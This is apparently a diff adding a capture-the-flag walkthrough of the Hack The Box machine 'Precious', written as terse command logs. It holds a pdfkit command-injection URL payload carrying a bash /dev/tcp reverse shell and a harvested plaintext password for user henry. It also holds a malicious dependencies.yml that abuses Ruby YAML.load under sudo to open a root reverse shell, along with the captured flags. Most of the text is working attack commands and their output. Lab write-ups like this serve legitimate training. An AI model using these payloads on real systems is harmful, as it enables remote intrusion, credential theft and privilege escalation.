@@ -1,0 +1,114 @@
+Machine-Name : Precious
+IP Address   : 10.10.11.189
+
+Command-Line: sudo nmap 10.10.11.189 -p- -A -T4 -o nmap/init.txt
+Result:
+    ./nmap/init.txt
+
+Notes: Added precious.htb to /etc/hosts. precious.htb has a webpage to PDF converter.
+
+Command-Line: python3 -m http.server 8001
+Notes: Input URL - http://10.10.14.32/8001
+Result:
+    Downloaded PDF file.
+
+Notes: Examined with exiftool and found pdfkit v0.8.6 being used. Searching for exploit...
+
+Google: pdfkit v0.8.6 exploit
+URL: https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795
+Code: http://example.com/?name=#{'%20`sleep 5`'}
+
+Notes: Changed code to: http://example.com/?name=#{'%20`bash -c "bash -i >& /dev/tcp/10.10.14.32/9001 0>&1"`'}
+
+Command-Line: nc -lvnp 9001
+Result:
+    Reverse Shell
+    ruby@precious:/var/www/pdfapp$
+
+ruby@precious:/var/www/pdfapp$ cd /home
+ruby@precious:~/
+
+ruby@precious:~$ ls -la
+    ls -la
+    total 32
+    drwxr-xr-x 5 ruby ruby 4096 Dec 23 10:56 .
+    drwxr-xr-x 4 root root 4096 Oct 26 08:28 ..
+    lrwxrwxrwx 1 root root    9 Oct 26 07:53 .bash_history -> /dev/null
+    -rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout
+    -rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrc
+    dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .bundle
+    drwxr-xr-x 3 ruby ruby 4096 Dec 23 09:36 .cache
+    drwx------ 3 ruby ruby 4096 Dec 23 10:56 .gnupg
+    -rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profile
+    ruby@precious:~$ cd .bundle
+    cd .bundle
+    ruby@precious:~/.bundle$ ls -la
+    ls -la
+    total 12
+    dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .
+    drwxr-xr-x 5 ruby ruby 4096 Dec 23 10:56 ..
+    -r-xr-xr-x 1 root ruby   62 Sep 26 05:04 config
+    ruby@precious:~/.bundle$ cat config
+    cat config
+    ---
+    BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
+
+Notes: Found credentials for Henry.
+username:password
+henry:Q3c1AqGHtoI0aXAYFH
+
+henry user flag: d56f3b0f78bade4cec7af2e572e821f2
+
+henry@precious:~$ sudo -l
+Result:
+    Matching Defaults entries for henry on precious:
+        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+    User henry may run the following commands on precious:
+        (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
+
+Result:
+    Traceback (most recent call last):
+            2: from /opt/update_dependencies.rb:17:in `<main>'
+            1: from /opt/update_dependencies.rb:10:in `list_from_file'
+    /opt/update_dependencies.rb:10:in `read': No such file or directory @ rb_sysopen - dependencies.yml (Errno::ENOENT)
+
+Notes: Output of the file reveals the YAML.load function is being used to load a missing file called dependencies.yml - Searching for exploit...
+
+Google: YAML.load ruby exploit
+URL-1: https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/
+URL-2: https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565
+
+Notes: Exploit allows RCE with malicious .yml file.
+
+Command-Line: nano ./www/dependencies.yml
+Result:
+    ./www/dependencies.yml
+
+Notes: Changed "git_set" in dependencies.yml with a reverse bash shell.
+Result:
+    git_set: bash -c "bash -i >& /dev/tcp/10.10.14.32/9002 0>&1"
+
+henry@precious:~$ curl http://10.10.14.32:8001/dependencies.yml -o dependencies.yml
+Result:
+    /home/henry/dependencies.yml
+
+Command-Line: nc -lvnp 9002
+
+henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
+Result:
+    connect to [10.10.14.32] from (UNKNOWN) [10.10.11.189] 43882
+    root@precious:/home/henry# whoami
+    whoami
+    root
+    root@precious:/home/henry# cd
+    cd
+    root@precious:~# ls
+    ls
+    root.txt
+    root@precious:~# cat root.txt
+    cat root.txt
+
+    henry root flag: 8a11268b15583cbb9757d6a83180f34e
+
+      FINISHED
